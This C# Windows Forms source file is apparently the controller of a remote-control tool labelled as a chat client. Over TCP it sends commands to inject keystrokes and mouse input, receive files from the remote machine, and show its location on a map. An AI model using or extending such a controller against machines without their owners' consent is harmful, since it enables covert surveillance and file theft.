using System;
using System.Windows.Forms;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace chatKey
{
    public partial class FormMain : Form
    {
        public int maxByte = 10000000;
        TcpClient clientSocket;
        NetworkStream serverStream = default(NetworkStream);
        public Thread ctThread;
        string readData = null;
        bool conect = false;
        int port = 7777;
        public FormMain()
        {
            InitializeComponent();
        }

        private void buttonMasge_Click(object sender, EventArgs e)
        {
            if (!conect)
                return;
            string mes = "";
            if (textBoxMesgeBody.Text != "" && textBoxMesgeBody.Text != "body")
                mes = ";" + textBoxMesgeBody.Text;
            sendChat(textBoxMesgeName.Text + mes);
        }

        private void buttonConect_Click(object sender, EventArgs e)
        {
            try
            {
                if (textBoxIp.Items.IndexOf(textBoxIp.Text) == -1)
                    textBoxIp.Items.Add(textBoxIp.Text);
                
                readData = "Conected to Chat Server ...";
                msg();
                clientSocket = new TcpClient();
                clientSocket.Connect(textBoxIp.Text, port);
                serverStream = clientSocket.GetStream();

                byte[] outStream = System.Text.Encoding.ASCII.GetBytes(myClass.defrent.nameComputer() + "$");
                serverStream.Write(outStream, 0, outStream.Length);
                serverStream.Flush();

                ctThread = new Thread(getMessage);
                ctThread.Start();
                textBoxIp.Enabled = false;
                conect = true;
            }
            catch (Exception p)
            {
                if (textBoxIp.Items.IndexOf(textBoxIp.Text) != -1)
                    textBoxIp.Items.Remove(textBoxIp.Text);
                textBoxBord.Text = "ero ip: " + textBoxIp.Text + ", not conection" + Environment.NewLine;
            }
        }

        private void getMessage()
        {
            while (true)
            {
                serverStream = clientSocket.GetStream();
                byte[] inStream = new byte[maxByte];
                serverStream.Read(inStream, 0, maxByte);
                string[] streamToString = Encoding.ASCII.GetString(inStream).Split('^')[0].Split('$');
                string read = streamToString[0];
                string nameServer = read.Split(']')[0] + "]";
                string[] returndata = read.Replace(nameServer + " ", "").Split(';');
                readData = nameServer + " ";
                string search = returndata[0];
                switch (search)
                {
                    case "copyFileAc":
                        {
                            MessageBox.Show(streamToString[0] + "\n" + streamToString[1], streamToString.Length + "");
                            byte[] dataByte = Encoding.ASCII.GetBytes(streamToString[1]);
                            string url = myClass.myData.Sava + @"\Data" + nameServer;
                            Directory.CreateDirectory(url);
                            FileInfo f = new FileInfo(returndata[1]);
                            url += @"\" + f.Name;
                            if (bool.Parse(returndata[2]))
                            {
                                File.WriteAllBytes(url, dataByte);
                            }
                            readData += returndata[1] + " |exit :" + returndata[2];
                        }
                        break;
                    case "getDataTo":
                        {
                            FormGoogleMaps fom = new FormGoogleMaps(returndata[1].Split(':')[1]);
                            fom.ShowDialog();
                            readData += returndata[1].Split(':')[0];
                        }
                        break;
                    case "getUrlTo":
                        {
                            MessageBox.Show(returndata[1]);
                            readData = "";
                        }
                        break;
                    default:
                        {
                            readData += returndata[0];
                        }
                        break;
                }
                msg();
            }
        }
        private void msg()
        {
            if (this.InvokeRequired)
                this.Invoke(new MethodInvoker(msg));
            else
            {
                if (readData != "")
                    textBoxBord.Text = textBoxBord.Text + readData + Environment.NewLine;
            }
        }
        public void sendChat(string massge)
        {
            byte[] outStream = System.Text.Encoding.ASCII.GetBytes(massge + "$");
            serverStream.Write(outStream, 0, outStream.Length);
            serverStream.Flush();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (conect)
                sendChat("exit");
        }

        private void buttonRemove_Click(object sender, EventArgs e)
        {
            if (conect)
            {
                sendChat("exit");
                textBoxIp.Enabled = true;
                conect = false;
                clientSocket.Close();
                serverStream.Close();
                ctThread.Abort();
                textBoxBord.Text += "[" + textBoxIp.Text + "] remove" + Environment.NewLine;
            }
        }

        private void clearBord(object sender, EventArgs e)
        {
            textBoxBord.Text = "";
        }

        private void textBoxIp_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                FormNameToIp fom = new FormNameToIp();
                fom.ShowDialog();
                textBoxIp.Text = fom.ret;
            }
        }

        private void textBoxMesgeName_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode != Keys.Enter)
                return;
            switch (textBoxMesgeName.Text)
            {
                case "setText":
                    {
                        Formkeys fom = new Formkeys();
                        fom.ShowDialog();
                        textBoxMesgeBody.Text = fom.ret;
                    }
                    break;
                case "setMouse":
                    {
                        FormMouse fom = new FormMouse();
                        fom.ShowDialog();
                        textBoxMesgeBody.Text = fom.ret;
                    }
                    break;
            }
        }

        private void FormMain_Load(object sender, EventArgs e)
        {
            string[] sort = new string[textBoxMesgeName.Items.Count];
            for (int i = 0; i < sort.Length; i++)
            {
                sort[i] = "" + textBoxMesgeName.Items[i];
            }
            Array.Sort(sort);
            textBoxMesgeName.Items.Clear();
            textBoxMesgeName.Items.AddRange(sort);
        }
    }
}